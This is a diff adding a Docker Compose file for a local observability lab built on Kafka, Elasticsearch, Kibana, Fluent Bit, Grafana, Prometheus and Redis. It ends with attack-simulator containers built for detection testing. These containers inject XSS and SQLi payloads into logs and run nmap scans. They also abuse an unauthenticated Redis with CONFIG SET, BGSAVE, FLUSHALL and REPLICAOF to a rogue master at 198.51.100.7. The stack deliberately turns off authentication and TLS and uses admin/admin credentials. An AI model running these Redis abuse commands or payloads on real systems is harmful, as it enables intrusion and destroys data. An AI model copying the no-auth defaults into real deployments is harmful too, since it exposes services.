@@ -1,0 +1,501 @@
+name: obsdocker
+
+x-kafka-common: &kafka-common
+  image: confluentinc/cp-kafka:${KAFKA_VERSION}
+  restart: unless-stopped
+  environment: &kafka-env
+    KAFKA_PROCESS_ROLES: 'broker,controller'
+    KAFKA_CONTROLLER_QUORUM_VOTERS: '1@kafka1:9093,2@kafka2:9093,3@kafka3:9093'
+    KAFKA_LISTENER_SECURITY_PROTOCOL_MAP: 'CONTROLLER:PLAINTEXT,INTERNAL:PLAINTEXT,EXTERNAL:PLAINTEXT'
+    KAFKA_INTER_BROKER_LISTENER_NAME: 'INTERNAL'
+    KAFKA_CONTROLLER_LISTENER_NAMES: 'CONTROLLER'
+    KAFKA_OFFSETS_TOPIC_REPLICATION_FACTOR: 3
+    KAFKA_TRANSACTION_STATE_LOG_REPLICATION_FACTOR: 3
+    KAFKA_TRANSACTION_STATE_LOG_MIN_ISR: 2
+    KAFKA_GROUP_INITIAL_REBALANCE_DELAY_MS: 0
+    KAFKA_DEFAULT_REPLICATION_FACTOR: 3
+    KAFKA_MIN_INSYNC_REPLICAS: 2
+    KAFKA_AUTO_CREATE_TOPICS_ENABLE: 'true'
+    KAFKA_NUM_PARTITIONS: 6
+    CLUSTER_ID: ${KAFKA_CLUSTER_ID}
+    KAFKA_HEAP_OPTS: -Xms${KAFKA_HEAP} -Xmx${KAFKA_HEAP}
+  networks:
+    - obs
+  healthcheck:
+    test: ["CMD-SHELL", "kafka-broker-api-versions --bootstrap-server localhost:9092 >/dev/null 2>&1"]
+    interval: 10s
+    timeout: 5s
+    retries: 20
+    start_period: 30s
+
+x-es-common: &es-common
+  image: docker.elastic.co/elasticsearch/elasticsearch:${ELASTIC_VERSION}
+  restart: unless-stopped
+  environment: &es-env
+    cluster.name: obs-cluster
+    cluster.initial_master_nodes: es01,es02,es03
+    xpack.security.enabled: "false"
+    xpack.security.enrollment.enabled: "false"
+    ES_JAVA_OPTS: -Xms${ES_HEAP} -Xmx${ES_HEAP}
+    action.destructive_requires_name: "true"
+    bootstrap.memory_lock: "true"
+  ulimits:
+    memlock: { soft: -1, hard: -1 }
+    nofile: { soft: 65536, hard: 65536 }
+  networks:
+    obs:
+      aliases:
+        - elasticsearch
+  healthcheck:
+    test: ["CMD-SHELL", "curl -sf http://localhost:9200/_cluster/health | grep -qE '\"status\":\"(yellow|green)\"'"]
+    interval: 10s
+    timeout: 5s
+    retries: 30
+    start_period: 40s
+
+services:
+  # ---------- Kafka (KRaft, 3 brokers) ----------
+  kafka1:
+    <<: *kafka-common
+    container_name: kafka1
+    hostname: kafka1
+    environment:
+      <<: *kafka-env
+      KAFKA_NODE_ID: 1
+      KAFKA_LISTENERS: 'INTERNAL://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093,EXTERNAL://0.0.0.0:19092'
+      KAFKA_ADVERTISED_LISTENERS: 'INTERNAL://kafka1:9092,EXTERNAL://localhost:19092'
+    ports:
+      - "${BIND}:19092:19092"
+    volumes:
+      - kafka1-data:/var/lib/kafka/data
+
+  kafka2:
+    <<: *kafka-common
+    container_name: kafka2
+    hostname: kafka2
+    environment:
+      <<: *kafka-env
+      KAFKA_NODE_ID: 2
+      KAFKA_LISTENERS: 'INTERNAL://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093,EXTERNAL://0.0.0.0:19092'
+      KAFKA_ADVERTISED_LISTENERS: 'INTERNAL://kafka2:9092,EXTERNAL://localhost:19093'
+    ports:
+      - "${BIND}:19093:19092"
+    volumes:
+      - kafka2-data:/var/lib/kafka/data
+
+  kafka3:
+    <<: *kafka-common
+    container_name: kafka3
+    hostname: kafka3
+    environment:
+      <<: *kafka-env
+      KAFKA_NODE_ID: 3
+      KAFKA_LISTENERS: 'INTERNAL://0.0.0.0:9092,CONTROLLER://0.0.0.0:9093,EXTERNAL://0.0.0.0:19092'
+      KAFKA_ADVERTISED_LISTENERS: 'INTERNAL://kafka3:9092,EXTERNAL://localhost:19094'
+    ports:
+      - "${BIND}:19094:19092"
+    volumes:
+      - kafka3-data:/var/lib/kafka/data
+
+  # ---------- Kafka Connect (Elasticsearch sink) ----------
+  kafka-connect:
+    image: confluentinc/cp-kafka-connect:${CONNECT_VERSION}
+    container_name: kafka-connect
+    hostname: kafka-connect
+    restart: unless-stopped
+    depends_on:
+      kafka1: { condition: service_healthy }
+      kafka2: { condition: service_healthy }
+      kafka3: { condition: service_healthy }
+      es01:   { condition: service_healthy }
+      es02:   { condition: service_healthy }
+      es03:   { condition: service_healthy }
+    environment:
+      CONNECT_BOOTSTRAP_SERVERS: 'kafka1:9092,kafka2:9092,kafka3:9092'
+      CONNECT_REST_ADVERTISED_HOST_NAME: kafka-connect
+      CONNECT_REST_LISTENERS: http://0.0.0.0:8083
+      CONNECT_GROUP_ID: obs-connect
+      CONNECT_CONFIG_STORAGE_TOPIC: _connect-configs
+      CONNECT_OFFSET_STORAGE_TOPIC: _connect-offsets
+      CONNECT_STATUS_STORAGE_TOPIC: _connect-status
+      CONNECT_CONFIG_STORAGE_REPLICATION_FACTOR: 3
+      CONNECT_OFFSET_STORAGE_REPLICATION_FACTOR: 3
+      CONNECT_STATUS_STORAGE_REPLICATION_FACTOR: 3
+      CONNECT_KEY_CONVERTER: org.apache.kafka.connect.storage.StringConverter
+      CONNECT_VALUE_CONVERTER: org.apache.kafka.connect.json.JsonConverter
+      CONNECT_VALUE_CONVERTER_SCHEMAS_ENABLE: "false"
+      CONNECT_PLUGIN_PATH: "/usr/share/java,/usr/share/confluent-hub-components"
+    command:
+      - bash
+      - -c
+      - |
+        if [ ! -d /usr/share/confluent-hub-components/confluentinc-kafka-connect-elasticsearch ]; then
+          echo "Installing Elasticsearch sink connector ${ES_CONNECTOR_VERSION} ..."
+          confluent-hub install --no-prompt confluentinc/kafka-connect-elasticsearch:${ES_CONNECTOR_VERSION}
+        fi
+        exec /etc/confluent/docker/run
+    ports:
+      - "${BIND}:8083:8083"
+    volumes:
+      - connect-plugins:/usr/share/confluent-hub-components
+    networks:
+      - obs
+    healthcheck:
+      test: ["CMD-SHELL", "curl -sf http://localhost:8083/ >/dev/null"]
+      interval: 10s
+      timeout: 5s
+      retries: 20
+      start_period: 60s
+
+  # ---------- Elasticsearch (3-node cluster, all master+data) ----------
+  es01:
+    <<: *es-common
+    container_name: es01
+    hostname: es01
+    environment:
+      <<: *es-env
+      node.name: es01
+      discovery.seed_hosts: es02,es03
+    ports:
+      - "${BIND}:9200:9200"
+    volumes:
+      - es01-data:/usr/share/elasticsearch/data
+
+  es02:
+    <<: *es-common
+    container_name: es02
+    hostname: es02
+    environment:
+      <<: *es-env
+      node.name: es02
+      discovery.seed_hosts: es01,es03
+    volumes:
+      - es02-data:/usr/share/elasticsearch/data
+
+  es03:
+    <<: *es-common
+    container_name: es03
+    hostname: es03
+    environment:
+      <<: *es-env
+      node.name: es03
+      discovery.seed_hosts: es01,es02
+    volumes:
+      - es03-data:/usr/share/elasticsearch/data
+
+  # ---------- Kibana ----------
+  kibana:
+    image: docker.elastic.co/kibana/kibana:${KIBANA_VERSION}
+    container_name: kibana
+    hostname: kibana
+    restart: unless-stopped
+    depends_on:
+      es01: { condition: service_healthy }
+      es02: { condition: service_healthy }
+      es03: { condition: service_healthy }
+    environment:
+      ELASTICSEARCH_HOSTS: '["http://es01:9200","http://es02:9200","http://es03:9200"]'
+      SERVER_PUBLICBASEURL: http://localhost:5601
+    ports:
+      - "${BIND}:5601:5601"
+    networks:
+      - obs
+
+  # ---------- Fluent Bit ----------
+  fluent-bit:
+    image: fluent/fluent-bit:${FLUENTBIT_VERSION}
+    container_name: fluent-bit
+    hostname: fluent-bit
+    restart: unless-stopped
+    depends_on:
+      kafka1: { condition: service_healthy }
+      kafka2: { condition: service_healthy }
+      kafka3: { condition: service_healthy }
+    volumes:
+      - ./fluent-bit/fluent-bit.conf:/fluent-bit/etc/fluent-bit.conf:ro
+      - ./fluent-bit/parsers.conf:/fluent-bit/etc/parsers.conf:ro
+      - /var/lib/docker/containers:/var/lib/docker/containers:ro
+      - /var/log/journal:/var/log/journal:ro
+      - /etc/machine-id:/etc/machine-id:ro
+      - fluent-bit-state:/var/lib/fluent-bit
+    ports:
+      - "${BIND}:24224:24224"
+      - "${BIND}:24224:24224/udp"
+      - "${BIND}:8888:8888"
+      - "${BIND}:2020:2020"
+    networks:
+      - obs
+
+  # ---------- Grafana ----------
+  grafana:
+    image: grafana/grafana:${GRAFANA_VERSION}
+    container_name: grafana
+    hostname: grafana
+    restart: unless-stopped
+    depends_on:
+      es01: { condition: service_healthy }
+      es02: { condition: service_healthy }
+      es03: { condition: service_healthy }
+    environment:
+      - GF_SECURITY_ADMIN_USER=admin
+      - GF_SECURITY_ADMIN_PASSWORD=admin
+      - GF_USERS_ALLOW_SIGN_UP=false
+    volumes:
+      - ./grafana/provisioning:/etc/grafana/provisioning:ro
+      - grafana-data:/var/lib/grafana
+    ports:
+      - "${BIND}:3000:3000"
+    networks:
+      - obs
+
+  # ---------- Kafka UI (browser for topics, consumer groups, connectors) ----------
+  kafka-ui:
+    image: provectuslabs/kafka-ui:${KAFKA_UI_VERSION}
+    container_name: kafka-ui
+    hostname: kafka-ui
+    restart: unless-stopped
+    depends_on:
+      kafka1: { condition: service_healthy }
+    environment:
+      KAFKA_CLUSTERS_0_NAME: obs
+      KAFKA_CLUSTERS_0_BOOTSTRAPSERVERS: kafka1:9092,kafka2:9092,kafka3:9092
+      KAFKA_CLUSTERS_0_KAFKACONNECT_0_NAME: connect
+      KAFKA_CLUSTERS_0_KAFKACONNECT_0_ADDRESS: http://kafka-connect:8083
+    ports:
+      - "${BIND}:8080:8080"
+    networks:
+      - obs
+
+  # ---------- Redis ----------
+  redis:
+    image: redis:${REDIS_VERSION}
+    container_name: redis
+    hostname: redis
+    restart: unless-stopped
+    command: ["redis-server", "--save", "", "--appendonly", "no"]
+    ports:
+      - "${BIND}:6379:6379"
+    networks:
+      - obs
+    healthcheck:
+      test: ["CMD", "redis-cli", "ping"]
+      interval: 10s
+      timeout: 3s
+      retries: 10
+      start_period: 5s
+
+  redis-exporter:
+    image: oliver006/redis_exporter:${REDIS_EXPORTER_VERSION}
+    container_name: redis-exporter
+    hostname: redis-exporter
+    restart: unless-stopped
+    depends_on:
+      redis: { condition: service_healthy }
+    environment:
+      REDIS_ADDR: redis://redis:6379
+    ports:
+      - "${BIND}:9121:9121"
+    networks:
+      - obs
+
+  # ---------- Prometheus ----------
+  prometheus:
+    image: prom/prometheus:${PROMETHEUS_VERSION}
+    container_name: prometheus
+    hostname: prometheus
+    restart: unless-stopped
+    command:
+      - --config.file=/etc/prometheus/prometheus.yml
+      - --storage.tsdb.path=/prometheus
+      - --storage.tsdb.retention.time=7d
+      - --web.enable-lifecycle
+    volumes:
+      - ./prometheus/prometheus.yml:/etc/prometheus/prometheus.yml:ro
+      - prometheus-data:/prometheus
+    ports:
+      - "${BIND}:9090:9090"
+    networks:
+      - obs
+
+  # ---------- Optional: synthetic log generator (profile=demo) ----------
+  # Uses the fluentd docker log driver so its logs go directly to fluent-bit's
+  # forward input (tag=app.flog), bypassing the tail-from-disk path. This both
+  # demonstrates per-source routing and avoids fluent-bit tailing its own emissions.
+  log-generator:
+    image: mingrammer/flog:${FLOG_VERSION}
+    container_name: log-generator
+    restart: unless-stopped
+    command: ["-f", "json", "-d", "1s", "-l"]
+    profiles: ["demo"]
+    depends_on:
+      fluent-bit:
+        condition: service_started
+    networks:
+      - obs
+    logging:
+      driver: fluentd
+      options:
+        fluentd-address: "127.0.0.1:24224"
+        fluentd-async: "true"
+        tag: app.flog
+
+  # ---------- Optional: redis workload generator (profile=demo) ----------
+  redis-benchmark:
+    image: redis:${REDIS_VERSION}
+    container_name: redis-benchmark
+    restart: unless-stopped
+    command:
+      - sh
+      - -c
+      - |
+        while true; do
+          redis-benchmark -h redis -q -t set,get,incr,lpush,lpop,sadd,spop -n 5000 -c 5
+          sleep 3
+        done
+    profiles: ["demo"]
+    depends_on:
+      redis: { condition: service_healthy }
+    networks:
+      - obs
+
+  # ---------- Attack simulators (profile=attack) ----------
+  # Bad-actor containers exercising the no-auth/no-TLS posture of the stack so
+  # attacks show up as signals in both logs (ES) and metrics (Prometheus).
+  # Destructive against the local Redis (FLUSHALL etc) — the redis service is
+  # ephemeral (--save "" --appendonly no) so this is fine for the dev box.
+
+  # Option 1: HTTP log poisoning. Crafted JSON into fluent-bit:8888 → tag
+  # app.http → topic `logs` → data stream logs-fluentbit-logs. Search Kibana
+  # for the spoofed host/user/event fields, the XSS/SQLi payloads, and the
+  # oversized blob field.
+  log-injector:
+    image: curlimages/curl:8.10.1
+    container_name: log-injector
+    hostname: log-injector
+    restart: unless-stopped
+    profiles: ["attack"]
+    depends_on:
+      fluent-bit:
+        condition: service_started
+    networks:
+      - obs
+    entrypoint: ["/bin/sh", "-c"]
+    command:
+      - |
+        FB=http://fluent-bit:8888
+        BIG=$$(head -c 200000 /dev/urandom | base64 | tr -d '\n')
+        while true; do
+          # spoofed hostname impersonating kibana
+          curl -fsS -H 'content-type: application/json' -d \
+            '{"host":"kibana","level":"info","msg":"User admin logged in from 10.0.0.5"}' $$FB >/dev/null || true
+          # fake auth-success event impersonating an ES node
+          curl -fsS -H 'content-type: application/json' -d \
+            '{"host":"es01","level":"warn","event":"auth.success","user":"root","src_ip":"127.0.0.1"}' $$FB >/dev/null || true
+          # XSS payload in a field a dashboard panel might render unsanitised
+          curl -fsS -H 'content-type: application/json' -d \
+            '{"host":"app","msg":"<script>alert(1)</script>","ua":"<img src=x onerror=alert(1)>"}' $$FB >/dev/null || true
+          # SQLi-shaped payload — material for a future detection rule
+          curl -fsS -H 'content-type: application/json' -d \
+            "{\"host\":\"app\",\"query\":\"SELECT * FROM users WHERE name='\'' OR 1=1--\"}" $$FB >/dev/null || true
+          # oversized field to stress the parser / ES mapping
+          curl -fsS -H 'content-type: application/json' -d \
+            "{\"host\":\"app\",\"blob\":\"$$BIG\"}" $$FB >/dev/null || true
+          # malformed JSON — FB HTTP input rejects, but the attempt is a signal
+          curl -fsS -H 'content-type: application/json' --data-raw \
+            '{"host":"app","msg":"unterminated' $$FB >/dev/null || true
+          sleep 5
+        done
+
+  # Option 2: unauthenticated-Redis abuse against redis:6379.
+  # Watch the Grafana Redis dashboard light up (ops/sec, evicted_keys,
+  # rejected_connections) while the redis container logs (tailed by FB) carry
+  # the refused DEBUG / replica-of attempts into ES.
+  redis-exploiter:
+    image: redis:${REDIS_VERSION}
+    container_name: redis-exploiter
+    hostname: redis-exploiter
+    restart: unless-stopped
+    profiles: ["attack"]
+    depends_on:
+      redis: { condition: service_healthy }
+    networks:
+      - obs
+    entrypoint: ["/bin/sh", "-c"]
+    command:
+      - |
+        R="redis-cli -h redis"
+        while true; do
+          echo "[exploiter] recon"
+          $$R INFO server | head -8
+          $$R CLIENT LIST
+          echo "[exploiter] keyspace pollution"
+          # one connection, pipelined writes — visible as a sharp ops/sec spike
+          { for i in $$(seq 1 2000); do printf 'SET attacker:key:%s %s\r\n' "$$i" "$$(date -u +%s)"; done; } | $$R --pipe
+          echo "[exploiter] blocking KEYS *"
+          $$R KEYS '*' | wc -l
+          echo "[exploiter] RDB-write precursor (CONFIG SET dir/dbfilename + BGSAVE)"
+          $$R CONFIG SET dir /tmp || true
+          $$R CONFIG SET dbfilename pwned.rdb || true
+          $$R BGSAVE || true
+          echo "[exploiter] DEBUG SLEEP (expected to be refused on 7.x)"
+          $$R DEBUG SLEEP 2 || true
+          echo "[exploiter] REPLICAOF to a rogue master"
+          $$R REPLICAOF 198.51.100.7 6379 || true
+          sleep 5
+          $$R REPLICAOF NO ONE || true
+          echo "[exploiter] FLUSHALL"
+          $$R FLUSHALL || true
+          sleep 10
+        done
+
+  # Option 5: network recon — nmap service-version scans + NSE HTTP probes
+  # against every named service on the obs network. Generates dense connection
+  # patterns logged by every TCP-accepting service (ES, Kibana, Grafana,
+  # Kafka-UI, Kafka brokers, Connect REST), all of which flow through FB tail
+  # into ES. NSE http-enum walks dozens of common discovery paths automatically.
+  recon:
+    image: instrumentisto/nmap:7.95
+    container_name: recon
+    hostname: recon
+    restart: unless-stopped
+    profiles: ["attack"]
+    depends_on:
+      fluent-bit:
+        condition: service_started
+    networks:
+      - obs
+    entrypoint: ["/bin/sh", "-c"]
+    command:
+      - |
+        TARGETS="es01 es02 es03 kibana kafka1 kafka2 kafka3 kafka-connect kafka-ui grafana prometheus redis redis-exporter fluent-bit"
+        HTTP_PORTS="3000,5601,8080,8083,9090,9200,2020,8888"
+        while true; do
+          echo "[recon] phase 1: service-version sweep"
+          nmap -sV --version-light --top-ports 200 -T4 $$TARGETS || true
+          sleep 5
+          echo "[recon] phase 2: NSE HTTP discovery"
+          nmap -p $$HTTP_PORTS \
+               --script=http-title,http-headers,http-enum,http-methods,http-robots.txt \
+               $$TARGETS || true
+          sleep 5
+          echo "[recon] phase 3: banner-grab on Kafka broker ports"
+          nmap -sV -p 9092,9093,19092 -T4 kafka1 kafka2 kafka3 || true
+          sleep 30
+        done
+
+networks:
+  obs:
+    name: obs
+    driver: bridge
+
+volumes:
+  es01-data:
+  es02-data:
+  es03-data:
+  kafka1-data:
+  kafka2-data:
+  kafka3-data:
+  connect-plugins:
+  grafana-data:
+  fluent-bit-state:
+  prometheus-data:
